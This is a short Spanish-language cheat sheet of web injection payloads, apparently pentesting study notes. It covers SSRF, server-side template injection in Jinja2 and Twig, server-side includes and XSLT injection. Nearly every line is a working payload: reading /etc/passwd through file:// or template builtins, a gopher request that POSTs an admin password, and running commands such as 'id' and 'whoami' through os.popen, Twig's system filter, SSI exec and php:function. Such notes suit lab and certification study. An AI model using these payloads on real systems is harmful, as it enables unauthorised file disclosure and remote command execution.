# SSRF
- Conexion a servicios (Realizar enumeracion de puertos o archivos)
```
127.0.0.1
127.1
localhost
```

- Lectura de archivos
```
file:///etc/passwd
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```
O usar gopherus.py

- Blind
1. Validacion con nuestro ipa nuestro http o nc
2. Respuesta diferente por parte del servidor

# SSTI
Identificando con ${{<%[%'"}}%\.
<img width="921" height="598" alt="image" src="https://github.com/user-attachments/assets/d4ecd157-0ea1-47dc-aff0-5698862a1b4b" />

## Jinja2
```
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## Twig
```
{{ _self }}
{{ "/etc/passwd"|file_excerpt(1,-1) }}
{{ ['id'] | filter('system') }}
```

# SSII
Archivos que acaban con .shtml, .shtm, and .stm spn vulnerables
```
<!--#printenv -->
<!--#config errmsg="Error!" -->
<!--#exec cmd="whoami" -->
<!--#include virtual="index.html" -->
```

# XSLTI
El ataque puede ser en un parametro como xss o en un subida de archivos

```
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
<xsl:value-of select="php:function('system','id')" />
```
